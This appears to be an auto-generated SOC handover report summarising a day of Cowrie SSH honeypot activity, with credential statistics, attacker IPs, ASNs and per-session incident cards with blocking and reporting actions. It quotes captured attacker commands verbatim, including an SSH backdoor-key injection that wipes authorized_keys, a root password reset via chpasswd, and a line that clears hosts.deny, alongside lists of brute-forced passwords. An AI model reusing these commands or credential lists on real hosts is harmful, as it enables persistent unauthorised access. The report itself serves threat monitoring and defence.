# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-28 |
| **Generated At** | 2026-03-28T06:56:59Z |
| **Shift Time** | 06:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **78** |
| Confirmed Threats | **71** |
| False Positives Filtered | **7** (9.0%) |
| Unique Attacker IPs | **48** |
| Countries of Origin | **19** |
| High Severity Cases | **29** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **49** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **57** |
| Unique Credential Pairs | **43** |
| Unique Usernames | **16** |
| Unique Passwords | **42** |
| Successful Auth Pairs | **27** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `345gs5662d34` | 7 |
| `nobody` | 4 |
| `default` | 3 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 6 |
| `Password` | 2 |
| `root2002` | 2 |
| `root@123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 6 |
| `root` | `Password` | 2 |
| `root` | `root2002` | 2 |
| `root` | `root@123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Password` | `14.97.77.182` | 2026-03-28T04:48:28 |
| `root` | `Password` | `122.187.226.12` | 2026-03-28T04:48:36 |
| `root` | `g00gleplex` | `147.50.231.135` | 2026-03-28T05:01:15 |
| `root` | `3245gs5662d34` | `147.50.231.135` | 2026-03-28T05:01:18 |
| `root` | `Roland2026` | `59.99.177.131` | 2026-03-28T05:06:35 |
| `root` | `3245gs5662d34` | `59.99.177.131` | 2026-03-28T05:06:37 |
| `root` | `Asdfg@12345` | `147.50.231.135` | 2026-03-28T05:06:38 |
| `root` | `123456xyz` | `147.50.231.135` | 2026-03-28T05:12:00 |
| `root` | `Password123` | `8.138.226.108` | 2026-03-28T05:22:06 |
| `root` | `Million2` | `8.138.226.108` | 2026-03-28T05:22:07 |
| `root` | `mateusz` | `8.138.226.108` | 2026-03-28T05:22:23 |
| `root` | `carrie1` | `8.138.226.108` | 2026-03-28T05:22:40 |
| `root` | `johndeere1` | `8.138.226.108` | 2026-03-28T05:22:41 |
| `root` | `000webhost` | `8.138.226.108` | 2026-03-28T05:22:46 |
| `root` | `smith1` | `8.138.226.108` | 2026-03-28T05:22:50 |
| `root` | `wolves1` | `8.138.226.108` | 2026-03-28T05:23:21 |
| `root` | `welcome12` | `8.138.226.108` | 2026-03-28T05:23:22 |
| `root` | `juicy1` | `8.138.226.108` | 2026-03-28T05:23:53 |
| `root` | `root2002` | `78.36.41.213` | 2026-03-28T05:28:34 |
| `root` | `root2002` | `178.178.194.137` | 2026-03-28T05:28:41 |
| `root` | `root@123` | `218.248.9.102` | 2026-03-28T05:39:59 |
| `root` | `root@123` | `76.132.238.43` | 2026-03-28T05:40:12 |
| `root` | `ansible@123` | `223.17.5.126` | 2026-03-28T06:03:49 |
| `root` | `3245gs5662d34` | `223.17.5.126` | 2026-03-28T06:03:52 |
| `root` | `Docker@2025` | `58.187.118.57` | 2026-03-28T06:09:45 |
| `root` | `3245gs5662d34` | `58.187.118.57` | 2026-03-28T06:09:49 |
| `root` | `Password@01` | `14.103.114.227` | 2026-03-28T06:18:00 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:OAqhgPzg0SG1"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.114.227`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `223.17.5.126`, `59.99.177.131`, `147.50.231.135`, `58.187.118.57`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **48** |
| Unique ASNs | **39** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS9829` | National Internet Backbone | 3 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS9443` | Vocus Retail | 1 | HIGH |
| `AS43743` | Kruiz LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (29)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-27fe3e442194

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-03-28 04:48 |
| **Last Seen** | 2026-03-28 04:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 04:48:27` | `cowrie.session.connect` |
| `2026-03-28 04:48:27` | `cowrie.client.version` |
| `2026-03-28 04:48:27` | `cowrie.client.kex` |
| `2026-03-28 04:48:28` | `cowrie.login.success` |
| `2026-03-28 04:48:29` | `cowrie.direct-tcpip.request` |
| `2026-03-28 04:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a897ab5e2880

| Field | Detail |
|---|---|
| **Source IP** | `122.187.226[.]12` |
| **First Seen** | 2026-03-28 04:48 |
| **Last Seen** | 2026-03-28 04:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 04:48:34` | `cowrie.session.connect` |
| `2026-03-28 04:48:35` | `cowrie.client.version` |
| `2026-03-28 04:48:35` | `cowrie.client.kex` |
| `2026-03-28 04:48:36` | `cowrie.login.success` |
| `2026-03-28 04:48:37` | `cowrie.direct-tcpip.request` |
| `2026-03-28 04:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.226[.]12` to AbuseIPDB if not already reported
- [ ] Block `122.187.226[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a36abee157f

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 05:01 |
| **Last Seen** | 2026-03-28 05:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:01:15` | `cowrie.session.connect` |
| `2026-03-28 05:01:15` | `cowrie.client.version` |
| `2026-03-28 05:01:15` | `cowrie.client.kex` |
| `2026-03-28 05:01:15` | `cowrie.login.success` |
| `2026-03-28 05:01:15` | `cowrie.session.params` |
| `2026-03-28 05:01:15` | `cowrie.command.input` |
| `2026-03-28 05:01:15` | `cowrie.command.failed` |
| `2026-03-28 05:01:15` | `cowrie.log.closed` |
| `2026-03-28 05:01:16` | `cowrie.session.params` |
| `2026-03-28 05:01:16` | `cowrie.command.input` |
| `2026-03-28 05:01:16` | `cowrie.session.file_download` |
| `2026-03-28 05:01:16` | `cowrie.log.closed` |
| `2026-03-28 05:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d468dc1a464f

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 05:01 |
| **Last Seen** | 2026-03-28 05:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:01:17` | `cowrie.session.connect` |
| `2026-03-28 05:01:17` | `cowrie.client.version` |
| `2026-03-28 05:01:18` | `cowrie.client.kex` |
| `2026-03-28 05:01:18` | `cowrie.login.success` |
| `2026-03-28 05:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6cbe488288

| Field | Detail |
|---|---|
| **Source IP** | `59.99.177[.]131` |
| **First Seen** | 2026-03-28 05:06 |
| **Last Seen** | 2026-03-28 05:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:06:35` | `cowrie.session.connect` |
| `2026-03-28 05:06:35` | `cowrie.client.version` |
| `2026-03-28 05:06:35` | `cowrie.client.kex` |
| `2026-03-28 05:06:35` | `cowrie.login.success` |
| `2026-03-28 05:06:35` | `cowrie.session.params` |
| `2026-03-28 05:06:35` | `cowrie.command.input` |
| `2026-03-28 05:06:35` | `cowrie.command.failed` |
| `2026-03-28 05:06:36` | `cowrie.log.closed` |
| `2026-03-28 05:06:36` | `cowrie.session.params` |
| `2026-03-28 05:06:36` | `cowrie.command.input` |
| `2026-03-28 05:06:36` | `cowrie.session.file_download` |
| `2026-03-28 05:06:36` | `cowrie.log.closed` |
| `2026-03-28 05:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.99.177[.]131` to AbuseIPDB if not already reported
- [ ] Block `59.99.177[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ce6baca957d

| Field | Detail |
|---|---|
| **Source IP** | `59.99.177[.]131` |
| **First Seen** | 2026-03-28 05:06 |
| **Last Seen** | 2026-03-28 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:06:37` | `cowrie.session.connect` |
| `2026-03-28 05:06:37` | `cowrie.client.version` |
| `2026-03-28 05:06:37` | `cowrie.client.kex` |
| `2026-03-28 05:06:37` | `cowrie.login.success` |
| `2026-03-28 05:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.99.177[.]131` to AbuseIPDB if not already reported
- [ ] Block `59.99.177[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c7ef7866401

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 05:06 |
| **Last Seen** | 2026-03-28 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:06:37` | `cowrie.session.connect` |
| `2026-03-28 05:06:37` | `cowrie.client.version` |
| `2026-03-28 05:06:37` | `cowrie.client.kex` |
| `2026-03-28 05:06:38` | `cowrie.login.success` |
| `2026-03-28 05:06:38` | `cowrie.session.params` |
| `2026-03-28 05:06:38` | `cowrie.command.input` |
| `2026-03-28 05:06:38` | `cowrie.command.failed` |
| `2026-03-28 05:06:38` | `cowrie.log.closed` |
| `2026-03-28 05:06:38` | `cowrie.session.params` |
| `2026-03-28 05:06:38` | `cowrie.command.input` |
| `2026-03-28 05:06:38` | `cowrie.session.file_download` |
| `2026-03-28 05:06:38` | `cowrie.log.closed` |
| `2026-03-28 05:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-390cc6ec1751

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 05:06 |
| **Last Seen** | 2026-03-28 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:06:40` | `cowrie.session.connect` |
| `2026-03-28 05:06:40` | `cowrie.client.version` |
| `2026-03-28 05:06:40` | `cowrie.client.kex` |
| `2026-03-28 05:06:40` | `cowrie.login.success` |
| `2026-03-28 05:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90b3ba948ce3

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 05:12 |
| **Last Seen** | 2026-03-28 05:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:12:00` | `cowrie.session.connect` |
| `2026-03-28 05:12:00` | `cowrie.client.version` |
| `2026-03-28 05:12:00` | `cowrie.client.kex` |
| `2026-03-28 05:12:00` | `cowrie.login.success` |
| `2026-03-28 05:12:00` | `cowrie.session.params` |
| `2026-03-28 05:12:00` | `cowrie.command.input` |
| `2026-03-28 05:12:00` | `cowrie.command.failed` |
| `2026-03-28 05:12:00` | `cowrie.log.closed` |
| `2026-03-28 05:12:01` | `cowrie.session.params` |
| `2026-03-28 05:12:01` | `cowrie.command.input` |
| `2026-03-28 05:12:01` | `cowrie.session.file_download` |
| `2026-03-28 05:12:01` | `cowrie.log.closed` |
| `2026-03-28 05:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-267173a12ca8

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 05:12 |
| **Last Seen** | 2026-03-28 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:12:03` | `cowrie.session.connect` |
| `2026-03-28 05:12:03` | `cowrie.client.version` |
| `2026-03-28 05:12:03` | `cowrie.client.kex` |
| `2026-03-28 05:12:04` | `cowrie.login.success` |
| `2026-03-28 05:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e00c55c9ab65

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:22 |
| **Last Seen** | 2026-03-28 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:22:06` | `cowrie.session.connect` |
| `2026-03-28 05:22:06` | `cowrie.client.version` |
| `2026-03-28 05:22:06` | `cowrie.client.kex` |
| `2026-03-28 05:22:06` | `cowrie.login.success` |
| `2026-03-28 05:22:06` | `cowrie.session.params` |
| `2026-03-28 05:22:06` | `cowrie.command.input` |
| `2026-03-28 05:22:07` | `cowrie.log.closed` |
| `2026-03-28 05:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94793938b545

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:22 |
| **Last Seen** | 2026-03-28 05:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:22:07` | `cowrie.session.connect` |
| `2026-03-28 05:22:07` | `cowrie.client.version` |
| `2026-03-28 05:22:07` | `cowrie.client.kex` |
| `2026-03-28 05:22:07` | `cowrie.login.success` |
| `2026-03-28 05:22:07` | `cowrie.session.params` |
| `2026-03-28 05:22:07` | `cowrie.command.input` |
| `2026-03-28 05:22:08` | `cowrie.log.closed` |
| `2026-03-28 05:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b422cefd9045

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:22 |
| **Last Seen** | 2026-03-28 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:22:23` | `cowrie.session.connect` |
| `2026-03-28 05:22:23` | `cowrie.client.version` |
| `2026-03-28 05:22:23` | `cowrie.client.kex` |
| `2026-03-28 05:22:23` | `cowrie.login.success` |
| `2026-03-28 05:22:24` | `cowrie.session.params` |
| `2026-03-28 05:22:24` | `cowrie.command.input` |
| `2026-03-28 05:22:24` | `cowrie.log.closed` |
| `2026-03-28 05:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17144d3cd804

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:22 |
| **Last Seen** | 2026-03-28 05:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:22:40` | `cowrie.session.connect` |
| `2026-03-28 05:22:40` | `cowrie.client.version` |
| `2026-03-28 05:22:40` | `cowrie.client.kex` |
| `2026-03-28 05:22:40` | `cowrie.login.success` |
| `2026-03-28 05:22:41` | `cowrie.session.params` |
| `2026-03-28 05:22:41` | `cowrie.command.input` |
| `2026-03-28 05:22:41` | `cowrie.log.closed` |
| `2026-03-28 05:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28d723df5d46

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:22 |
| **Last Seen** | 2026-03-28 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:22:41` | `cowrie.session.connect` |
| `2026-03-28 05:22:41` | `cowrie.client.version` |
| `2026-03-28 05:22:41` | `cowrie.client.kex` |
| `2026-03-28 05:22:41` | `cowrie.login.success` |
| `2026-03-28 05:22:42` | `cowrie.session.params` |
| `2026-03-28 05:22:42` | `cowrie.command.input` |
| `2026-03-28 05:22:42` | `cowrie.log.closed` |
| `2026-03-28 05:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
